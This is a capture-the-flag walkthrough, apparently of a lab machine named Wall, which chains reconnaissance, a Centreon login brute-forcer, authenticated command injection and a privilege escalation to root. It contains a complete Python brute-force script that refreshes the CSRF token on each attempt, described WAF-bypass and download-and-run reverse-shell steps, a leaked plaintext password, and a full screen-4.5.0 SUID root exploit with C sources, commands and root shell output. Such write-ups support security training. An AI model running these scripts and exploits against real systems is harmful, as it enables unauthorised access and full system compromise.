Started with a nmap scan
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAWTqpexXdcWJOW7L3jQ6WzlOSWe903X2ZwciybZmsBFIRSa8A6nUztI2vzFr8B+tFcVrH23TrgAML8y/3fKP5pSKsbDXbwo0+myq4roF37fx5/bxDlYIrFV1Ni73FdzxOHWxJy2heVgGcv/OmKktNMjHomq0NlX2i++aAF7AR2j+vP5M4JY92t3ucmKh+QTZnvOdLNjBlFNFoJ10VvAtX9j8PJa4MruowGjLuqHYDl1KkMweJB5Us7wzdG8gIg8/1AY+r4TeIu1QgkOCmCmav8cp3AiWE2WwILnSfiezyVdlZLpmPIrSwdfLIf+M9fZb6h58PYHUngD3regbWR5Z3
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIZz9miawtkv9Tu8stf0CPwQJ4NvlbFe5iIWvwbfw/KMbrJqM3H/QUREu8pYMhFwP2YRWpkrSUXM5KEgR4YujgE=
|   256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOzrOlDBkdWSJ+DrMvZ4P0UEbBDUYaCWFqnS4o0LETtS
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Going to the webserver its just a default apache page so going to run a gobuster scan 
```
/monitoring
```
going to this page it ask us for username and password tested a couple defult logins and all failed so I got the request into BURP and was playing with the HTTP verb options and set it to `POST` and added a `username=admin&password=admin` and we got to the login in page its running a `centron` Network Monitoring we need to make a python script becuas we need to get a new `csrf` token for each request we can use chatGPT to help us and after a little testing we got the login `admin:password1` 
```
#!/usr/bin/env python3
"""
centreon_bruteforce_with_failstring.py

Usage:
  python3 centreon_bruteforce_with_failstring.py \
    --url "http://10.10.10.157/centreon/index.php" \
    --user admin \
    --passwords passwords.txt \
    --failed-string "Your credentials are incorrect" \
    --delay 0.5

Dependencies:
  pip install requests beautifulsoup4
"""

import requests
import time
import argparse
import sys
import re
from bs4 import BeautifulSoup

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": None,
    "Referer": None,
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

def get_csrf_token(session: requests.Session, login_url: str, headers: dict) -> str:
    resp = session.get(login_url, headers=headers, allow_redirects=True, timeout=15)
    resp.raise_for_status()
    html = resp.text
    soup = BeautifulSoup(html, "html.parser")
    inp = soup.find("input", {"name": "centreon_token"})
    if inp and inp.get("value"):
        return inp.get("value")
    # fallback regex
    m = re.search(r'centreon_token\s*[:=]\s*[\'"]([0-9a-fA-F]+)[\'"]', html)
    if m:
        return m.group(1)
    raise RuntimeError("centreon_token not found on login page")

def attempt_login(session: requests.Session, login_url: str, user: str, password: str, token: str, headers: dict) -> requests.Response:
    payload = {
        "useralias": user,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    # Use allow_redirects=False to inspect redirects separately
    resp = session.post(login_url, data=payload, headers=headers, allow_redirects=False, timeout=20)
    return resp

def is_success(resp: requests.Response, fail_string: str=None):
    """
    Determine success based on:
      - server redirect -> success
      - fail_string present -> explicit failure
      - otherwise, if fail_string provided but not present -> treat as success
    Returns (bool, reason_string)
    """
    # 1) redirect is a common success indicator
    if resp.status_code in (301, 302, 303, 307, 308):
        return True, f"HTTP redirect {resp.status_code}"

    # load body if available
    body = resp.text or ""

    if fail_string:
        if fail_string in body:
            return False, "failed-string present"
        else:
            # not present => likely success (or different failure). We'll treat as success.
            return True, "failed-string not found in response body"
    else:
        # no fail_string provided: attempt heuristic
        lowered = body.lower()
        if "invalid" in lowered or "incorrect" in lowered:
            return False, "generic failure detected in body"
        # fallback: if token is still present in the returned page, likely failed
        if "centreon_token" in body:
            return False, "login page token still present (likely failed)"
        return True, "heuristic: no failure markers found"

def run_bruteforce(login_url: str, user: str, password_file: str, fail_string: str=None, delay: float=0.5, proxy: str=None, save_file: str="found.txt"):
    session = requests.Session()
    headers = DEFAULT_HEADERS.copy()
    parsed_origin = re.match(r'^(https?://[^/]+)', login_url)
    if parsed_origin:
        origin = parsed_origin.group(1)
        headers["Origin"] = origin
        headers["Referer"] = login_url

    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})

    with open(password_file, "r", encoding="utf-8", errors="ignore") as fh:
        passwords = [line.strip() for line in fh if line.strip()]

    print(f"[+] Loaded {len(passwords)} passwords")
    attempt = 0
    for pw in passwords:
        attempt += 1
        try:
            token = get_csrf_token(session, login_url, headers)
        except Exception as e:
            print(f"[!] Could not get CSRF token on attempt {attempt}: {e}")
            return

        try:
            resp = attempt_login(session, login_url, user, pw, token, headers)
        except requests.RequestException as e:
            print(f"[!] Request error on attempt {attempt} (pw='{pw}'): {e}")
            time.sleep(delay)
            continue

        success, reason = is_success(resp, fail_string=fail_string)
        print(f"[{attempt}/{len(passwords)}] pw='{pw}' -> HTTP {resp.status_code} -> {reason}")

        if success:
            print("\n[+] POTENTIAL SUCCESS")
            print(f"User: {user}")
            print(f"Password: {pw}")
            with open(save_file, "a") as out:
                out.write(f"{user}:{pw}\n")
            print(f"[+] Saved to {save_file}")
            # Optionally follow the redirect or fetch landing page to confirm
            try:
                if resp.is_redirect or resp.status_code in (301,302,303,307,308):
                    loc = resp.headers.get("Location")
                    print(f"[+] Redirected to: {loc}")
                else:
                    # fetch page where user would land to give more confidence
                    landing = session.get(login_url, headers=headers, timeout=10)
                    snippet = (landing.text or "")[:800]
                    print("[+] Landing page snippet (first 800 chars):")
                    print(snippet)
            except Exception:
                pass
            return  # stop after first success

        time.sleep(delay)

    print("[!] Completed list: no credentials found (per the failure-string heuristic).")

def main():
    parser = argparse.ArgumentParser(description="Centreon login tester using a known failed-login string.")
    parser.add_argument("--url", required=True, help="Login POST URL (e.g. http://10.10.10.157/centreon/index.php)")
    parser.add_argument("--user", required=True, help="Username (useralias)")
    parser.add_argument("--passwords", required=True, help="File of passwords (one per line)")
    parser.add_argument("--failed-string", required=True, help='Exact failure message (e.g. "Your credentials are incorrect")')
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts (seconds)")
    parser.add_argument("--proxy", default=None, help="Optional proxy (http://127.0.0.1:8080)")
    parser.add_argument("--save-file", default="found.txt", help="File to append successful credentials")
    args = parser.parse_args()

    try:
        run_bruteforce(args.url, args.user, args.passwords, fail_string=args.failed_string, delay=args.delay, proxy=args.proxy, save_file=args.save_file)
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```
so now were logged in we can use `CVE-2019-17501` 
```
navigate to: Configuration > Commands > Discovery
in the "Command Line" section put a command: id
press the blue play icon under the "Command Line" section|
```
and now we have RCE time to get a reverse shell and its also vulnerable to `CVE-2019-13024` but there is a WAF or something blocking the exploits so we need to proxychains it to are burp and change the payload to download a script and then run it on the host spaces with `{IFS}` works and now we have access to the server looking around there is a python compiled in `/opt/.shelby/backup` we can decompile it with `uncompyle6` and then look at the out put and we get a array with a password in it `ShelbyPassw@rdIsStrong!` and this is the creds for the user account of `shelby` and the script logs in with ssh and puts a `html.zip` there is also a SUID binary `screen-4.5.0` 
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

`rootshell.c`:

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```
www-data@Wall:/tmp$ cd /etc
www-data@Wall:/etc$ umask 000
www-data@Wall:/etc$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
www-data@Wall:/etc$ /bin/screen-4.5.0 -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@Wall:/etc$ /tmp/rootshell
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
# 
```
